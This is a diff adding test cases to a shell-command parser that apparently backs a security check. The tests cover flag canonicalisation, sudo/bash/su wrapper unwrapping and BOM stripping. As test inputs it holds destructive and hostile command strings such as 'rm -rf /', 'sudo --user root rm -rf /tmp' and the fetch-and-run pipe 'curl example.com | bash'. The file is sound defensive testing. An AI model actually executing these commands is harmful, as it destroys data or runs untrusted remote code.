@@ -6,7 +6,8 @@
 // silently misses a real-world bypass.
 
 import { describe, expect, test } from "bun:test";
-import { DYNAMIC, parse } from "../src/index.js";
+import { DYNAMIC, findCalls, parse } from "../src/index.js";
+import { unwrapCall } from "../src/semantic.js";
 import { testCmd } from "./_assertions.js";
 
 describe("quoted flags must canonicalize the same as bare flags", () => {
@@ -162,4 +163,116 @@ describe("privilege escalators (audit B1, B4)", () => {
     commandString: "rm -rf /",
   });
   testCmd(`sh -c "rm -rf /"`, { wrapper: "sh", cmd: null, commandString: "rm -rf /" });
+});
+
+describe("resolveFlags canonicalization edge cases (agent bug-hunt)", () => {
+  // #10/11 — short-flag fabrication. Pre-fix, `-=value` exploded into
+  // `["-=","-v","-a","-l","-u","-e"]`. Combined-short expansion must
+  // only apply to pure-letter runs.
+  testCmd("cmd -=value", { cmd: "cmd", flags: ["-=value"], args: [] });
+  testCmd("cmd -ab=c", { cmd: "cmd", flags: ["-ab=c"], args: [] });
+  testCmd("gcc -O2 foo.c", { cmd: "gcc", flags: ["-O2"], args: ["foo.c"] });
+  // Letter-only stays expanded (regression check)
+  testCmd("rm -rf /", { cmd: "rm", flags: ["-r", "-f"], args: ["/"] });
+
+  // #13 — empty DblQuoted is "", not unresolvable
+  testCmd('echo ""', { cmd: "echo", args: [""] });
+  testCmd("echo ''", { cmd: "echo", args: [""] });
+  testCmd('echo "" "y"', { cmd: "echo", args: ["", "y"] });
+
+  // #16 — second `--` is positional (end-of-flags already toggled)
+  testCmd("rm -- --", { cmd: "rm", flags: [], args: ["--"] });
+  testCmd("rm -- -a -b", { cmd: "rm", flags: [], args: ["-a", "-b"] });
+
+  // #18 — bare `-` is the POSIX stdin sentinel (positional, not a flag)
+  testCmd("cat -", { cmd: "cat", flags: [], args: ["-"] });
+  testCmd("cat - file", { cmd: "cat", flags: [], args: ["-", "file"] });
+  testCmd("diff a -", { cmd: "diff", flags: [], args: ["a", "-"] });
+});
+
+describe("parse() input preprocessing", () => {
+  // #29 — UTF-8 BOM stripped so first command name parses cleanly
+  test("UTF-8 BOM stripped from leading source", async () => {
+    const ast = await parse("﻿echo hello");
+    const stmt = ast.stmts[0]!;
+    if (stmt.cmd?.type !== "CallExpr") throw new Error();
+    const cmdLit = stmt.cmd.args[0]?.parts[0];
+    expect(cmdLit?.type).toBe("Lit");
+    if (cmdLit?.type === "Lit") expect(cmdLit.value).toBe("echo");
+  });
+
+  test("BOM-less source unaffected", async () => {
+    const ast = await parse("echo hello");
+    expect(ast.stmts).toHaveLength(1);
+  });
+});
+
+describe("wrapper edge cases — bug-hunt findings", () => {
+  // BUG-A — commandFlag with no value: wrapper preserved, no commandString
+  testCmd("bash -c", { wrapper: "bash", cmd: null, flags: ["-c"] });
+  testCmd("sh -c", { wrapper: "sh", cmd: null, flags: ["-c"] });
+  testCmd("su user -c", { wrapper: "su", cmd: null, flags: ["-c"] });
+
+  // BUG-B — dynamic inner cmd: wrapper preserved
+  test("sudo $cmd — wrapper:sudo preserved when inner is dynamic", async () => {
+    const ast = await parse("sudo $cmd");
+    const u = unwrapCall(findCalls(ast)[0]!);
+    expect(u?.wrapper).toBe("sudo");
+    expect(u?.cmd).toBeNull();
+    expect(u?.args).toContain(DYNAMIC);
+  });
+
+  test("sudo -u root $cmd — wrapper:sudo preserved even after consumed -u root", async () => {
+    const ast = await parse("sudo -u root $cmd");
+    const u = unwrapCall(findCalls(ast)[0]!);
+    expect(u?.wrapper).toBe("sudo");
+    expect(u?.cmd).toBeNull();
+  });
+
+  // #20 — long-form flag with space value works for sudo
+  testCmd("sudo --user root rm -rf /tmp", { wrapper: "sudo", cmd: "rm" });
+  testCmd("sudo --user=root rm -rf /tmp", { wrapper: "sudo", cmd: "rm" });
+  testCmd("sudo --host myhost rm /", { wrapper: "sudo", cmd: "rm" });
+
+  // #35 — bash -c "script" trailing-args go to args; commandString is the script ONLY
+  test(`bash -c "rm" extra — commandString="rm", args=["extra"]`, async () => {
+    const ast = await parse(`bash -c "rm" extra`);
+    const u = unwrapCall(findCalls(ast)[0]!);
+    expect(u?.commandString).toBe("rm");
+    expect(u?.args).toEqual(["extra"]);
+  });
+});
+
+describe("wrapper-named commands invoked without an inner cmd (gh #7)", () => {
+  // Every shell wrapper has a non-wrapping invocation form. When it
+  // appears that way, unwrapCall must surface it as a normal call
+  // (wrapper:null, cmd:"bash") — not as null, which would hide it
+  // from every consumer rule.
+
+  testCmd("bash", { wrapper: null, cmd: "bash" });
+  testCmd("bash --version", { wrapper: null, cmd: "bash", flags: ["--version"] });
+  testCmd("bash -i", { wrapper: null, cmd: "bash", flags: ["-i"] });
+  testCmd("sh", { wrapper: null, cmd: "sh" });
+  testCmd("zsh -l", { wrapper: null, cmd: "zsh", flags: ["-l"] });
+  testCmd("sudo", { wrapper: null, cmd: "sudo" });
+  testCmd("sudo -V", { wrapper: null, cmd: "sudo", flags: ["-V"] });
+  testCmd("sudo -u root", { wrapper: null, cmd: "sudo" }); // -u consumed root; no inner cmd
+  testCmd("gosu user", { wrapper: null, cmd: "gosu" }); // positionalUser consumed
+  testCmd("su nobody", { wrapper: null, cmd: "su" });
+  testCmd("pkexec", { wrapper: null, cmd: "pkexec" });
+
+  // The canonical RCE pattern — bash on the right side of a pipe with no inner
+  // command. Both stages must be visible to findCalls AND unwrapCall.
+  test("curl example.com | bash — both stages surface as cmd-resolvable", async () => {
+    const { parse, findCalls } = await import("../src/index.js");
+    const { unwrapCall } = await import("../src/semantic.js");
+    const ast = await parse("curl example.com | bash");
+    const calls = findCalls(ast);
+    expect(calls).toHaveLength(2);
+    const left = unwrapCall(calls[0]!);
+    const right = unwrapCall(calls[1]!);
+    expect(left?.cmd).toBe("curl");
+    expect(right?.cmd).toBe("bash");
+    expect(right?.wrapper).toBeNull();
+  });
 });
